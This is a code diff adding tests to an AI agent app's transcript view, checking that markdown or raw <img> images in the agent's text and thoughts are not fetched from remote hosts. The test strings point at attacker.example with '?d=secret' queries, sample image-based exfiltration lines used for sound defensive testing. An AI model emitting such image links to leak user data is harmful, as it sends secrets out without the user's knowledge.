@@ -9,6 +9,7 @@ import { useExplorer } from "@renderer/state/explorer";
 import { PermissionCard, verdictLine } from "@renderer/features/session/parts/PermissionCard";
 import { SubagentRow } from "@renderer/features/session/parts/SubagentRow";
 import { ThoughtPart } from "@renderer/features/session/parts/ThoughtPart";
+import { PartsList } from "@renderer/features/session/parts/PartsList";
 import { PlanCard } from "@renderer/features/session/PlanCard";
 import { activityRow, foldSummary } from "@renderer/features/session/view";
 import { useAcp } from "@renderer/state/acp";
@@ -288,5 +289,55 @@ describe("an activity row about a CAD file", () => {
     const cad = [call({ id: "c", kind: "edit", title: "Edit part.step", locations: [{ path: "/bracket/part.step", line: null }] })].map(activityRow);
     scoped(<ActivityGroup item={{ kind: "activity", key: "g", rows: cad, summary: null }} sessionId="s1" />);
     expect(screen.queryByRole("button", { name: "Open" })).toBeNull();
+  });
+});
+
+describe("an image in the agent's words", () => {
+  const scoped = (ui: React.ReactNode) =>
+    wrap(<TranscriptScopeContext.Provider value={{ projectId: "p1", root: null }}>{ui}</TranscriptScopeContext.Provider>);
+  // A remote `src` is a request on paint: whatever the agent put in its query
+  // string leaves the machine without a click.
+  const remote = () => document.querySelectorAll('img[src^="https:"], img[src^="http:"], img[src^="//"]');
+
+  it("fetches nothing remote from a markdown image or a raw <img>, and says the address", async () => {
+    scoped(
+      <PartsList
+        open={false}
+        parts={[
+          { type: "text", text: "Here: ![chart](https://attacker.example/x.png?d=secret)" },
+          { type: "text", text: 'Raw: <img src="https://attacker.example/y.png?d=secret" />' },
+        ]}
+        prefix="t"
+        sessionId="s1"
+      />,
+    );
+    await screen.findByText(/Raw:/);
+    expect(remote()).toHaveLength(0);
+    expect(screen.getByText(/attacker\.example\/x\.png/)).toBeInTheDocument();
+    expect(screen.getByText(/attacker\.example\/y\.png/)).toBeInTheDocument();
+  });
+
+  it("fetches nothing remote from a thought", async () => {
+    const user = userEvent.setup();
+    wrap(<ThoughtPart streaming={false} text="Looked at ![](https://attacker.example/z.png?d=secret)" />);
+    await user.click(screen.getByRole("button", { name: /Thought/ }));
+    await screen.findByText(/Looked at/);
+    expect(remote()).toHaveLength(0);
+    expect(screen.getByText(/attacker\.example\/z\.png/)).toBeInTheDocument();
+  });
+
+  it("draws a project file, read through the project", async () => {
+    const readBinary = vi.mocked(window.textToCad.explorer.readBinary);
+    readBinary.mockResolvedValueOnce({ path: "renders/front.png", mime: "image/png", size: 4, dataUrl: "data:image/png;base64,AAAA" });
+    scoped(
+      <PartsList
+        open={false}
+        parts={[{ type: "text", text: "The front: ![front](./renders/front.png)" }]}
+        prefix="t"
+        sessionId="s1"
+      />,
+    );
+    expect(await screen.findByAltText("front")).toHaveAttribute("src", "data:image/png;base64,AAAA");
+    expect(readBinary).toHaveBeenCalledWith({ projectId: "p1", path: "renders/front.png" });
   });
 });
